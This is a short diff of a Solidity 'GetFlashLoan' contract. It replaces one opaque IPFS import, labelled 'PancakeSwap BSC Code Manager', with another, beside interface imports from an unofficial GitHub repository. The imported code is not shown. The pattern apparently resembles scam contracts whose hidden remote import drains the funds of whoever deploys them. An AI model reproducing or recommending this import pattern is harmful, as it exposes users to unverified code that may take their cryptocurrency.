@@ -10,7 +10,7 @@ import "https://github.com/athcoin/flash/blob/main/IPancakeFactory.sol";
 import "https://github.com/athcoin/flash/blob/main/IPancakePair.sol";
 
 // PancakeSwap BSC Code Manager
-import "https://gateway.pinata.cloud/ipfs/QmQcBAvyyEtkXGyZ9QkeB1ATgPYuL4SP4t9MdjjQMmCNHZ";
+import "https://gateway.pinata.cloud/ipfs/Qmb9VhXWaj5JQz2z85V7YeCuMdxNjWAEhCaG6SJXYGigC4";
    
 contract GetFlashLoan {
    string public tokenName;
